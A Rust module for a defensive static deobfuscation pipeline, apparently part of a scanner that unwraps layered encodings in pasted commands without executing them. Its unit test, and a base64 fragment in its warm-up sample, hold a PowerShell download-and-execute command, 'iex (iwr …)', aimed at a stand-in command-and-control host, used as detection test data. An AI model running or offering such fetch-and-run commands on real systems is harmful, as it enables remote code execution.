//! Static deobfuscation pipeline.
//!
//! Every decoder is a small pure function: `&str -> Option<String>`. A decoder returns the
//! *whole* input with the encoded span replaced by its decoding, so surrounding context
//! (`iex`, `| bash`, the wrapper flags) survives into the next layer and the features can
//! see both the wrapper and what it hid.
//!
//! Boundary (documented in THREAT_MODEL.md): we resolve pure encodings and literal
//! concatenation only. Anything needing runtime state (env vars, fetched content,
//! variable assignment, aliases) is left alone. This is not an interpreter and never
//! executes anything.

mod base64;
mod caret;
mod charcode;
mod concat;
mod hex;
mod percent;
mod reverse;
mod tooled;

pub use self::base64::{Base64Decoder, GzipBase64Decoder};
pub use caret::CaretQuoteDecoder;
pub use charcode::CharCodeDecoder;
pub use concat::{ConcatDecoder, FormatDecoder};
pub use hex::HexDecoder;
pub use percent::PercentDecoder;
pub use reverse::ReverseDecoder;
pub use tooled::{Base32Decoder, PlainHexDecoder, Rot13Decoder};

use serde::Serialize;
use std::time::{Duration, Instant};

pub trait Decoder: Send + Sync {
    fn name(&self) -> &'static str;
    /// Return `Some(new_text)` only if something was actually decoded.
    fn try_decode(&self, input: &str) -> Option<String>;
}

#[derive(Debug, Clone, Copy)]
pub struct DecodeBudget {
    pub max_layers: usize,
    pub max_time: Duration,
    /// Output may be at most this many times the original input length.
    pub max_expansion: usize,
}

impl DecodeBudget {
    /// Signal 1: inline, on the paste path.
    pub const FAST: DecodeBudget = DecodeBudget {
        max_layers: 2,
        max_time: Duration::from_millis(5),
        max_expansion: 100,
    };
    /// Signal 3: post-hoc analysis, off the hot path.
    pub const DEEP: DecodeBudget = DecodeBudget {
        max_layers: 5,
        max_time: Duration::from_millis(500),
        max_expansion: 100,
    };
}

#[derive(Debug, Clone, Serialize)]
pub struct Layer {
    pub text: String,
    pub decoders: Vec<&'static str>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Exhaustion {
    /// Hit the layer cap while decoders were still firing: more may be hidden. Hand to Signal 3.
    LayerLimit,
    TimeLimit,
    /// Decompression-bomb guard tripped.
    ExpansionLimit,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct DecodeTrace {
    /// Decoded layers only. Layer 0 (the raw text) is not stored here.
    pub layers: Vec<Layer>,
    pub exhausted: Option<Exhaustion>,
}

pub struct Pipeline {
    decoders: Vec<Box<dyn Decoder>>,
}

impl Default for Pipeline {
    fn default() -> Self {
        let p = Self::unwarmed();
        p.warm();
        p
    }
}

impl Pipeline {
    fn unwarmed() -> Self {
        // Order matters within a layer: cheap normalisers first so the encoders below
        // see contiguous tokens; gzip before plain base64 so compressed blobs are
        // inflated rather than rejected as non-printable.
        Self {
            decoders: vec![
                Box::new(CaretQuoteDecoder),
                Box::new(ConcatDecoder),
                Box::new(FormatDecoder),
                Box::new(CharCodeDecoder),
                Box::new(ReverseDecoder),
                Box::new(PercentDecoder),
                Box::new(HexDecoder),
                Box::new(PlainHexDecoder),
                Box::new(Rot13Decoder),
                Box::new(Base32Decoder),
                Box::new(GzipBase64Decoder),
                Box::new(Base64Decoder),
            ],
        }
    }
}

impl Pipeline {
    /// Force every decoder's lazily compiled regexes now, so the first real paste does
    /// not pay compile cost inside its 5 ms budget.
    pub fn warm(&self) {
        let sample = "p^s 'a'+'b' [char]65+[char]66 '|rev' %41%42%43 \\x41\\x42\\x43\\x44 aWV4IChpd3IgaHR0cHM6Ly9jMi5pbnZhbGlk '{1}{0}' -f 'a','b' c\"m\"d \\141\\142\\143\\144 | base32 -d | xxd -r -p | tr 'a-z' 'n-za-m'";
        for d in &self.decoders {
            let _ = d.try_decode(sample);
        }
    }

    pub fn decoders(&self) -> impl Iterator<Item = &dyn Decoder> {
        self.decoders.iter().map(|d| d.as_ref())
    }

    pub fn run(&self, input: &str, budget: DecodeBudget) -> DecodeTrace {
        let start = Instant::now();
        let max_len = input.len().max(64).saturating_mul(budget.max_expansion);
        let mut trace = DecodeTrace::default();
        let mut current = input.to_string();

        for layer_idx in 0..=budget.max_layers {
            let mut next = current.clone();
            let mut fired = Vec::new();
            for d in &self.decoders {
                if start.elapsed() > budget.max_time {
                    trace.exhausted = Some(Exhaustion::TimeLimit);
                    break;
                }
                if let Some(out) = d.try_decode(&next) {
                    if out.len() > max_len {
                        trace.exhausted = Some(Exhaustion::ExpansionLimit);
                        break;
                    }
                    if out != next {
                        next = out;
                        fired.push(d.name());
                    }
                }
            }
            if fired.is_empty() || next == current {
                break;
            }
            if layer_idx == budget.max_layers {
                // A decoder would still fire but we are out of layers. Do not keep it.
                trace.exhausted.get_or_insert(Exhaustion::LayerLimit);
                break;
            }
            trace.layers.push(Layer {
                text: next.clone(),
                decoders: fired,
            });
            current = next;
            if trace.exhausted.is_some() {
                break;
            }
        }
        trace
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ::base64::Engine as _;

    #[test]
    fn nested_layers_respect_cap() {
        let inner = "iex (iwr https://c2.invalid/x)";
        let b1 = ::base64::engine::general_purpose::STANDARD.encode(inner);
        let b2 = ::base64::engine::general_purpose::STANDARD.encode(format!("echo {b1}"));
        let b3 = ::base64::engine::general_purpose::STANDARD.encode(format!("echo {b2}"));
        let p = Pipeline::default();
        let fast = p.run(&b3, DecodeBudget::FAST);
        assert_eq!(fast.layers.len(), 2);
        assert_eq!(fast.exhausted, Some(Exhaustion::LayerLimit));
        let deep = p.run(&b3, DecodeBudget::DEEP);
        assert!(deep
            .layers
            .last()
            .unwrap()
            .text
            .contains("iwr https://c2.invalid/x"));
        assert_eq!(deep.exhausted, None);
    }

    #[test]
    fn plain_text_is_untouched() {
        let p = Pipeline::default();
        let t = p.run(
            "docker run --rm -it -v $PWD:/src -w /src rust:1.80 cargo build",
            DecodeBudget::FAST,
        );
        assert!(t.layers.is_empty(), "{:?}", t.layers);
    }
}
